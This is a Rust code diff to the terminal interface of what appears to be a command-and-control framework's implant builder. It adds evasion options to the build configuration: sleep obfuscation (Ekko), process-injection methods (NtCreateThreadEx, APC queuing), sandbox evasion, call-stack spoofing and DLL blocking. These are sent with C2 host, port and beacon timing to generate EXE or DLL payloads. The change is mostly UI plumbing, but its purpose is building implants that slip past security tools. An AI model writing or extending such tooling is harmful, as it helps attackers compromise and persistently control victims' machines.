@@ -130,12 +130,18 @@ pub struct App {
 
 #[derive(Debug, Default, Clone)]
 pub struct BuildConfigDraft {
-    pub listener_index: usize,
-    pub sleep_ms:       String,
-    pub jitter_pct:     String,
-    pub format_index:   usize,
-    pub output_path:    String,
-    pub focused_field:  usize,
+    pub listener_index:  usize,
+    pub sleep_ms:        String,
+    pub jitter_pct:      String,
+    pub format_index:    usize,
+    // Evasion option indices / toggles
+    pub sleep_obf_index: usize,  // 0=None, 1=Ekko, 2=NtDelayExec
+    pub inject_index:    usize,  // 0=CreateThread, 1=NtCreateThreadEx, 2=APC
+    pub sandbox_evasion: bool,
+    pub stack_spoof:     bool,
+    pub block_dlls:      bool,
+    pub output_path:     String,
+    pub focused_field:   usize,  // 0–9
 }
 
 impl App {
@@ -216,7 +222,7 @@ impl App {
                                     match bc.focused_field {
                                         1 => bc.sleep_ms.push(c),
                                         2 => bc.jitter_pct.push(c),
-                                        4 => bc.output_path.push(c),
+                                        9 => bc.output_path.push(c),
                                         _ => {}
                                     }
                                 }
@@ -226,7 +232,7 @@ impl App {
                                 match bc.focused_field {
                                     1 => { bc.sleep_ms.pop(); }
                                     2 => { bc.jitter_pct.pop(); }
-                                    4 => { bc.output_path.pop(); }
+                                    9 => { bc.output_path.pop(); }
                                     _ => {}
                                 }
                             }
@@ -540,13 +546,15 @@ impl App {
             }
             Tab::Build => match key.code {
                 KeyCode::Up   => { let bc = &mut self.build_config; if bc.focused_field > 0 { bc.focused_field -= 1; } }
-                KeyCode::Down => { let bc = &mut self.build_config; bc.focused_field = (bc.focused_field + 1).min(4); }
+                KeyCode::Down => { let bc = &mut self.build_config; bc.focused_field = (bc.focused_field + 1).min(9); }
                 KeyCode::Left => {
                     let llen = self.listeners.len();
                     let bc   = &mut self.build_config;
                     match bc.focused_field {
                         0 => { if bc.listener_index > 0 { bc.listener_index -= 1; } }
                         3 => { if bc.format_index > 0 { bc.format_index -= 1; } }
+                        4 => { if bc.sleep_obf_index > 0 { bc.sleep_obf_index -= 1; } }
+                        5 => { if bc.inject_index > 0 { bc.inject_index -= 1; } }
                         _ => {}
                     }
                     let _ = llen;
@@ -557,10 +565,32 @@ impl App {
                     match bc.focused_field {
                         0 => { if llen > 0 { bc.listener_index = (bc.listener_index + 1) % llen; } }
                         3 => { bc.format_index = (bc.format_index + 1) % 3; }
+                        4 => { bc.sleep_obf_index = (bc.sleep_obf_index + 1) % 3; }
+                        5 => { bc.inject_index = (bc.inject_index + 1) % 3; }
                         _ => {}
                     }
                 }
-                KeyCode::Enter => self.trigger_build().await,
+                KeyCode::Char(' ') => {
+                    let bc = &mut self.build_config;
+                    match bc.focused_field {
+                        6 => bc.sandbox_evasion = !bc.sandbox_evasion,
+                        7 => bc.stack_spoof     = !bc.stack_spoof,
+                        8 => bc.block_dlls      = !bc.block_dlls,
+                        _ => {}
+                    }
+                }
+                KeyCode::Enter => {
+                    let bc = &mut self.build_config;
+                    match bc.focused_field {
+                        6 => bc.sandbox_evasion = !bc.sandbox_evasion,
+                        7 => bc.stack_spoof     = !bc.stack_spoof,
+                        8 => bc.block_dlls      = !bc.block_dlls,
+                        _ => {}
+                    }
+                    if self.build_config.focused_field > 8 || self.build_config.focused_field < 6 {
+                        self.trigger_build().await;
+                    }
+                }
                 KeyCode::Char('i') => {
                     self.input_mode = InputMode::Insert;
                 }
@@ -607,6 +637,7 @@ impl App {
     }
 
     pub async fn trigger_build(&mut self) {
+        use ghoststrike_common::{SleepObfuscation, InjectionMethod};
         let bc = &self.build_config;
         let listeners: Vec<&ListenerConfig> = self.listeners.values().collect();
         let listener = match listeners.get(bc.listener_index) {
@@ -621,19 +652,34 @@ impl App {
             2 => PayloadFormat::Dll,
             _ => PayloadFormat::Exe,
         };
+        let sleep_obf = match bc.sleep_obf_index % 3 {
+            1 => SleepObfuscation::Ekko,
+            2 => SleepObfuscation::Timer,
+            _ => SleepObfuscation::None,
+        };
+        let injection = match bc.inject_index % 3 {
+            1 => InjectionMethod::NtCreateThreadEx,
+            2 => InjectionMethod::QueueUserApc,
+            _ => InjectionMethod::CreateThread,
+        };
         let cfg = BuildConfig {
-            listener_id:   listener.id,
-            c2_host:       listener.host.clone(),
-            c2_port:       listener.port,
-            protocol:      listener.protocol,
-            sleep_ms:      bc.sleep_ms.parse().unwrap_or(5000),
-            jitter_pct:    bc.jitter_pct.parse().unwrap_or(10),
+            listener_id:     listener.id,
+            c2_host:         listener.host.clone(),
+            c2_port:         listener.port,
+            protocol:        listener.protocol,
+            sleep_ms:        bc.sleep_ms.parse().unwrap_or(5000),
+            jitter_pct:      bc.jitter_pct.parse().unwrap_or(10),
             format,
-            output_path:   Some(bc.output_path.clone()),
-            dns_domain:    listener.dns_domain.clone(),
-            pipe_name:     listener.pipe_name.clone(),
-            c2_key:        String::new(),
-            server_pubkey: String::new(),
+            output_path:     Some(bc.output_path.clone()),
+            dns_domain:      listener.dns_domain.clone(),
+            pipe_name:       listener.pipe_name.clone(),
+            c2_key:          String::new(),
+            server_pubkey:   String::new(),
+            sleep_obf,
+            injection,
+            sandbox_evasion: bc.sandbox_evasion,
+            stack_spoof:     bc.stack_spoof,
+            block_dlls:      bc.block_dlls,
         };
         self.build_log.push(format!(
             "[*] Generating {} → {} ({}:{})",
